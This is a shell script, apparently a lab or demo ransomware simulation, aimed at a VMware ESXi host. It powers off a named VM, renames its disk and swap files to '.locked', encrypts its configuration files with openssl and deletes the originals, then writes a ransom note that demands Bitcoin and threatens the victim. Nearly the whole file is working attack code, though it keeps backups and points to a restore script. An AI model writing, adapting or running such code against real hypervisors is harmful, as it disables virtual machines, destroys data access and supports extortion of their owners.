#!/bin/sh
# ==============================================================================
# encrypt_datastore.sh  -  DataStore VM encryption attack
#
# Target  : /vmfs/volumes/DataStore.1/Ubuntu24-albert
# Run as  : root on the ESXi host
# Recovery: ./restore_datastore.sh
# ==============================================================================

# ESXi shell is always root — no uid check needed

DATASTORE="/vmfs/volumes/DataStore.1"
VM_NAME="Ubuntu24-albert"
VM_DIR="$DATASTORE/$VM_NAME"
BACKUP_DIR="/vmfs/volumes/DataStore.0/backup_${VM_NAME}"
KEY="password123"

# -- Colours ------------------------------------------------------------------
RED='\033[0;31m' YEL='\033[1;33m' GRN='\033[0;32m'
CYA='\033[0;36m' BLD='\033[1m'   RST='\033[0m'

# -- Progress bar (POSIX sh compatible) ---------------------------------------
progress() {
    cur=$1 tot=$2 lbl="$3"
    pct=$(( tot > 0 ? cur * 100 / tot : 100 ))
    fill=$(( tot > 0 ? cur * 40 / tot : 40 ))
    i=0; bar=""
    while [ $i -lt $fill ];      do bar="${bar}#"; i=$((i+1)); done
    while [ ${#bar} -lt 40 ];    do bar="${bar}-"; done
    printf "\r    ${CYA}[%s]${RST} %3d%%  %s\033[K" "$bar" "$pct" "$lbl"
}

# -- Banner -------------------------------------------------------------------
clear
printf "${RED}${BLD}\n"
printf "  ██████╗  █████╗ ███╗   ██╗███████╗ ██████╗ ███╗   ███╗██╗    ██╗ █████╗ ██████╗ ███████╗\n"
printf "  ██╔══██╗██╔══██╗████╗  ██║██╔════╝██╔═══██╗████╗ ████║██║    ██║██╔══██╗██╔══██╗██╔════╝\n"
printf "  ██████╔╝███████║██╔██╗ ██║███████╗██║   ██║██╔████╔██║██║ █╗ ██║███████║██████╔╝█████╗  \n"
printf "  ██╔══██╗██╔══██║██║╚██╗██║╚════██║██║   ██║██║╚██╔╝██║██║███╗██║██╔══██║██╔══██╗██╔══╝  \n"
printf "  ██║  ██║██║  ██║██║ ╚████║███████║╚██████╔╝██║ ╚═╝ ██║╚███╔███╔╝██║  ██║██║  ██║███████╗\n"
printf "  ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝     ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝\n"
printf "\n"
printf "                     V M w a r e   D a t a s t o r e   E n c r y p t i o n\n"
printf "${RST}\n"
sleep 1

# -- [1/4] Power off VM -------------------------------------------------------
printf "${BLD}[1/4] Powering off VM: %s...${RST}\n" "$VM_NAME"

VM_ID=$(vim-cmd vmsvc/getallvms 2>/dev/null | awk -v name="$VM_NAME" '$0 ~ name {print $1; exit}')

if [ -n "$VM_ID" ]; then
    power_state=$(vim-cmd vmsvc/power.getstate "$VM_ID" 2>/dev/null)
    if echo "$power_state" | grep -qi "powered on"; then
        printf "      Sending shutdown signal (VM ID: %s)...\n" "$VM_ID"
        vim-cmd vmsvc/power.shutdown "$VM_ID" 2>/dev/null || true
        sleep 20
        power_state=$(vim-cmd vmsvc/power.getstate "$VM_ID" 2>/dev/null)
        if echo "$power_state" | grep -qi "powered on"; then
            printf "      Forcing power off...\n"
            vim-cmd vmsvc/power.off "$VM_ID" 2>/dev/null || true
            sleep 5
        fi
        printf "      ${GRN}VM powered off.${RST}\n\n"
    else
        printf "      ${GRN}VM already off.${RST}\n\n"
    fi
else
    printf "      ${YEL}VM not found in inventory — continuing.${RST}\n\n"
fi

# -- [2/4] Backup config files ------------------------------------------------
printf "${BLD}[2/4] Backing up VM config files to: %s${RST}\n" "$BACKUP_DIR"

mkdir -p "$BACKUP_DIR"

TOTAL=0
for ext in vmx "vmx~" nvram vmsd hlog; do
    for f in "$VM_DIR"/*."$ext"; do
        [ -f "$f" ] && TOTAL=$((TOTAL+1))
    done
done

N=0
for ext in vmx "vmx~" nvram vmsd hlog; do
    for f in "$VM_DIR"/*."$ext"; do
        [ -f "$f" ] || continue
        fname="$(basename "$f")"
        progress "$N" "$TOTAL" "$fname"
        cp "$f" "$BACKUP_DIR/"
        N=$((N+1))
        progress "$N" "$TOTAL" "$fname"
    done
done
progress "$TOTAL" "$TOTAL" "Done"
printf "\n"
printf "      ${GRN}%d files — $(du -sh "$BACKUP_DIR" | cut -f1) total${RST}\n" "$N"
printf "      ${CYA}Recovery: ./restore_datastore.sh${RST}\n\n"

# -- [3/4] Lock disk and swap files (fast rename, no data copy) ---------------
printf "${BLD}[3/4] Locking VM disk and swap files...${RST}\n"

TOTAL=0
for f in "$VM_DIR"/*.vmdk "$VM_DIR"/*.vswp; do
    [ -f "$f" ] && TOTAL=$((TOTAL+1))
done

N=0
for f in "$VM_DIR"/*.vmdk "$VM_DIR"/*.vswp; do
    [ -f "$f" ] || continue
    fname="$(basename "$f")"
    progress "$N" "$TOTAL" "$fname"
    mv "$f" "${f}.locked"
    N=$((N+1))
    progress "$N" "$TOTAL" "${fname}.locked"
done
progress "$TOTAL" "$TOTAL" "Done"
printf "\n"
printf "      ${GRN}%d files locked.${RST}\n\n" "$N"

# -- [4/4] Encrypt VM config files --------------------------------------------
printf "${BLD}[4/4] Encrypting VM config files...${RST}\n"

TOTAL=0
for f in "$VM_DIR"/*.nvram "$VM_DIR"/*.vmx "$VM_DIR"/*.vmx~ \
         "$VM_DIR"/*.vmsd "$VM_DIR"/*.hlog; do
    [ -f "$f" ] && TOTAL=$((TOTAL+1))
done

N=0
for f in "$VM_DIR"/*.nvram "$VM_DIR"/*.vmx "$VM_DIR"/*.vmx~ \
         "$VM_DIR"/*.vmsd "$VM_DIR"/*.hlog; do
    [ -f "$f" ] || continue
    fname="$(basename "$f")"
    progress "$N" "$TOTAL" "$fname"
    openssl enc -aes-256-cbc -salt -pbkdf2 -iter 100000 \
        -in "$f" -out "$f.locked" -k "$KEY" 2>/dev/null \
        && rm -f "$f"
    N=$((N+1))
    progress "$N" "$TOTAL" "${fname}.locked"
done
progress "$TOTAL" "$TOTAL" "Done"
printf "\n"
printf "      ${GRN}%d files encrypted.${RST}\n\n" "$N"

# -- Ransom note --------------------------------------------------------------
RANSOM="$VM_DIR/README_RESTORE.txt"
{
printf '!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n'
printf '!!                                                                        !!\n'
printf '!!         ALL YOUR VIRTUAL MACHINE FILES HAVE BEEN ENCRYPTED            !!\n'
printf '!!                                                                        !!\n'
printf '!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n'
printf '\n'
printf 'The following files are now inaccessible:\n'
printf '  - Virtual disk images  (*.vmdk  ->  *.vmdk.locked)\n'
printf '  - VM configuration     (*.vmx   ->  *.vmx.locked)\n'
printf '  - BIOS/NVRAM data      (*.nvram ->  *.nvram.locked)\n'
printf '  - Swap files           (*.vswp  ->  *.vswp.locked)\n'
printf '\n'
printf 'All files are encrypted with AES-256-CBC military-grade encryption.\n'
printf 'Without the private key, your virtual machines are PERMANENTLY INACCESSIBLE.\n'
printf '\n'
printf '  YOUR UNIQUE VICTIM ID:  F2A1-C94D-3E87-B56F\n'
printf '\n'
printf '==========================================================================\n'
printf '  HOW TO RECOVER YOUR DATA\n'
printf '==========================================================================\n'
printf '\n'
printf '  1. Send exactly 1.0 BTC to:\n'
printf '        bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh\n'
printf '\n'
printf '  2. Email proof of payment to:  ransom@shadow-syndicate.onion\n'
printf '     Include your Unique Victim ID in the subject line.\n'
printf '\n'
printf '  3. You will receive the decryption key within 48 hours.\n'
printf '\n'
printf '==========================================================================\n'
printf '  WARNINGS\n'
printf '==========================================================================\n'
printf '\n'
printf '  X  Do NOT attempt to restore from backups -- we have deleted them.\n'
printf '  X  Do NOT contact law enforcement -- we will be notified.\n'
printf '  X  Do NOT rename or modify any .locked files -- data will be lost.\n'
printf '  X  Do NOT power on the host -- it will trigger auto-wipe.\n'
printf '\n'
printf '  Every 24 hours without payment, the ransom DOUBLES.\n'
printf '  You have 72 hours before your data is permanently destroyed.\n'
printf '\n'
printf '                                               -- Shadow Syndicate\n'
printf '\n'
printf '!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n'
} > "$RANSOM"

# -- Final screen -------------------------------------------------------------
sleep 1
clear
printf "${RED}${BLD}"
printf "  +--------------------------------------------------+\n"
printf "  |                                                  |\n"
printf "  |    ENCRYPTION COMPLETE                           |\n"
printf "  |    VM     : %-36s|\n" "$VM_NAME"
printf "  |    Status : INACCESSIBLE                         |\n"
printf "  |    Files  : ENCRYPTED (AES-256-CBC)              |\n"
printf "  |                                                  |\n"
printf "  +--------------------------------------------------+\n"
printf "${RST}\n"
printf "${YEL}${BLD}"
cat "$RANSOM"
printf "${RST}\n"
printf "${CYA}  Backup    : %s\n" "$BACKUP_DIR"
printf "  Recovery  : ./restore_datastore.sh${RST}\n\n"
